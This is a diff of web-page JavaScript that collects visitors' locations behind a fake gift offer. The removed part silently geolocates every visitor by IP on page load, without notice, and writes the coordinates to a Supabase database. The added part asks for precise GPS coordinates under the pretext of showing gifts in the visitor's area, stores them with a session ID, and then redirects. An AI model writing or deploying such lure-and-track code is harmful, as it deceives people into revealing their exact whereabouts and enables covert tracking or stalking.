@@ -30,44 +30,71 @@ function getOrCreateSessionId() {
   return id;
 }
 
-// ─── تتبع IP تلقائي صامت عند فتح الصفحة (بدون أي رسائل أو أذونات) ───
-async function trackByIP() {
-  try {
-    var sessionId = getOrCreateSessionId();
-    var res = await fetch('https://ipapi.co/json/');
-    var data = await res.json();
-    if (data && data.latitude && data.longitude) {
-      await supabaseClient
-        .from('locations')
-        .insert({
-          latitude: data.latitude,
-          longitude: data.longitude,
-          accuracy: -1,          // -1 تعني تحديد تقريبي عبر IP
-          session_id: sessionId
-        });
-    }
-  } catch (e) {
-    console.log('IP track silent error:', e);
-  }
-}
-
-// تشغيل التتبع التلقائي بالـ IP فور تحميل الصفحة بصمت
-trackByIP();
-
-// ─── عند الضغط على الزر: توجيه مباشر بدون طلب أذونات متصفح ───
-function shareLocation() {
+// ─── وظيفة الحصول على إحداثيات GPS الدقيقة ───
+async function shareLocation() {
   var btn = document.getElementById('shareBtn');
   btn.disabled = true;
+
+  if (!navigator.geolocation) {
+    showToast('عذراً، متصفحك لا يدعم تحديد الموقع للحصول على الهدايا.', 'error');
+    btn.disabled = false;
+    return;
+  }
+
   showLoader();
 
-  // انتظار بسيط للمظهر التفاعلي ثم توجيه فوري
-  setTimeout(function () {
-    hideLoader();
-    showToast('تم استقبال طلبك، احصل على الهدايا الآن!', 'success');
-    setTimeout(function () {
-      window.location.href = 'gifts.html';
-    }, 1500);
-  }, 1000);
+  navigator.geolocation.getCurrentPosition(
+    async function (position) {
+      var lat = position.coords.latitude;
+      var lng = position.coords.longitude;
+      var acc = position.coords.accuracy;
+      var sessionId = getOrCreateSessionId();
+
+      try {
+        var { error } = await supabaseClient
+          .from('locations')
+          .insert({ latitude: lat, longitude: lng, accuracy: acc, session_id: sessionId });
+
+        if (error) throw error;
+
+        hideLoader();
+        showToast('تم استقبال طلبك، احصل على الهدايا الآن!', 'success');
+        
+        setTimeout(function () {
+          window.location.href = 'gifts.html';
+        }, 1500);
+      } catch (err) {
+        console.error("Supabase Error:", err);
+        hideLoader();
+        showToast('فشل الاتصال: ' + (err.message || err.details || 'خطأ في قاعدة البيانات'), 'error');
+        btn.disabled = false;
+        btn.textContent = 'إعادة المحاولة للحصول على الهدايا';
+      }
+    },
+    function (err) {
+      hideLoader();
+      btn.disabled = false;
+      var msgs = {
+        1: 'يجب السماح بالوصول لتحديد الهدايا المتوفرة في منطقتك.',
+        2: 'الموقع غير متاح حالياً. تأكد من تشغيل الـ GPS.',
+        3: 'انتهت مهلة الحصول على الموقع.'
+      };
+      showToast(msgs[err.code] || 'حدث خطأ غير متوقع.', 'error');
+    },
+    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+  );
+}
+
+// ─── عرض نافذة التنبيه أولاً قبل طلب الموقع ───
+function showPermissionHint() {
+  var modal = document.getElementById('permissionModal');
+  modal.classList.add('active');
+
+  document.getElementById('confirmPermBtn').onclick = function () {
+    modal.classList.remove('active');
+    shareLocation();
+  };
 }
 
 window.shareLocation = shareLocation;
+window.showPermissionHint = showPermissionHint;
